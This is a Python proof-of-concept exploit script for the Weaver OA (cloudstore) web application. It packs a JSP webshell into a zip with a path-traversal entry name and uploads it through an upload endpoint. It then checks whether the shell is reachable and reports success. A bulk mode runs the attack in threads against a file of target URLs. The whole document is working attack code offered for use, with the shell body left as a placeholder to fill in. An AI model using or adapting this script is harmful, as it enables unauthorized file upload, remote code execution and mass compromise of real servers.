#!/usr/bin/python3
# coding: utf-8
import zipfile
import random
import sys
import argparse
import urllib3
import requests
import threadpool
urllib3.disable_warnings()

def generate_random_str(randomlength=16):
  random_str = ''
  base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
  length = len(base_str) - 1
  for i in range(randomlength):
    random_str += base_str[random.randint(0, length)]
  return random_str

mm = generate_random_str(8)

webshell_name1 = mm+'.jsp'
webshell_name2 = '../../../'+webshell_name1

def file_zip():
    shell = """test
    """   ## 替换shell内容
    zf = zipfile.ZipFile(mm+'.zip', mode='w', compression=zipfile.ZIP_DEFLATED)
    zf.writestr(webshell_name2, shell)

def GetShell(urllist):
    file_zip()
    #print('上传文件中')
    urls = urllist + '/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp'
    file = [('file1', (mm+'.zip', open(mm + '.zip', 'rb'), 'application/zip'))]
    try:
        requests.post(url=urls,files=file,timeout=7, verify=False)
        GetShellurl = urllist+'/cloudstore/'+webshell_name1
    except Exception as e:
        #print (e)
        pass
    try:
        GetShelllist = requests.get(url = GetShellurl)
        if GetShelllist.status_code == 200:
            print('\033[1;45m [+]利用成功webshell地址为:'+GetShellurl+' \033[0m')
        else:
            pass
            #print('未找到webshell利用失败')
    except Exception as e:
        #print (e)
        pass
def run(filename,pools=10):
    works = []
    with open(filename, "r") as f:
        for i in f:
            target_url = [i.rstrip()]
            works.append((target_url, None))
    pool = threadpool.ThreadPool(pools)
    reqs = threadpool.makeRequests(GetShell, works)
    [pool.putRequest(req) for req in reqs]
    pool.wait()

def usage():
    print("Usage:python3 poc.py -u url")
    print("Usage:python3 poc.py -f url.txt")
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u",
                        "--url",
                        help="Target URL; Example:http://ip:port")
    parser.add_argument("-f",
                        "--file",
                        help="Url File; Example:url.txt")
    args = parser.parse_args()
    url = args.url
    file_path = args.file
    if url != None and file_path ==None:
        GetShell(url)
    elif url == None and file_path != None:
        run(file_path, 10)
if __name__ == '__main__':
    usage()
    main()
